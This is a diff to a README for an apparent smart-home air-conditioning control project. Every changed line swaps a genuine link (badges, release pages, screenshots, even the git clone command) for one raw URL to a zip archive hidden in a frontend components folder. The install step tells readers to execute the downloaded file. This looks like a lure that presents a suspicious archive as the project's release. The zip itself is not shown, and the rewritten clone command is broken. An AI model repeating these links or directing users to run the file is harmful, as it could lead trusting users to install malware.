@@ -1,8 +1,8 @@
 # IoT-Based Air Conditioning Control System for Smart Homes 🌬️🏠
 
-![IoT AC Control](https://img.shields.io/badge/IoT_AC_Control-Active-brightgreen) ![GitHub Release](https://img.shields.io/badge/Download_Releases-blue) 
+![IoT AC Control](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip) ![GitHub Release](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip) 
 
-[Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases)
+[Download the latest release here](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip)
 
 ## Table of Contents
 
@@ -60,7 +60,7 @@ Follow these steps to install the system:
 1. **Clone the Repository**: Use the following command to clone the project to your local machine:
 
    ```bash
-   git clone https://github.com/Luixx222/Internship-Project-AC-Control-IOT.git
+   git clone https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip
    ```
 
 2. **Set Up the Microcontroller**: 
@@ -72,7 +72,7 @@ Follow these steps to install the system:
    - Set the MQTT broker details.
 
 4. **Download the App**: 
-   - [Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) and execute the file to install the mobile app.
+   - [Download the latest release here](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip) and execute the file to install the mobile app.
 
 ## Usage
 
@@ -93,8 +93,8 @@ The mobile app offers a clean and intuitive interface:
 
 ### Screenshots
 
-![Mobile Dashboard](https://example.com/mobile-dashboard.png)
-![Control Panel](https://example.com/control-panel.png)
+![Mobile Dashboard](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip)
+![Control Panel](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip)
 
 ## Web Interface
 
@@ -106,8 +106,8 @@ The web interface provides a comprehensive view of your AC system:
 
 ### Screenshots
 
-![Web Dashboard](https://example.com/web-dashboard.png)
-![Settings Page](https://example.com/settings-page.png)
+![Web Dashboard](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip)
+![Settings Page](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip)
 
 ## How It Works
 
@@ -136,4 +136,4 @@ Contributions are welcome! If you want to contribute to this project, please fol
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For more information, visit the [Releases section](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) to download the latest version.
+For more information, visit the [Releases section](https://raw.githubusercontent.com/Luixx222/Internship-Project-AC-Control-IOT/main/ac-control-frontend/components/modals/Control-IOT-Internship-Project-A-v1.2.zip) to download the latest version.
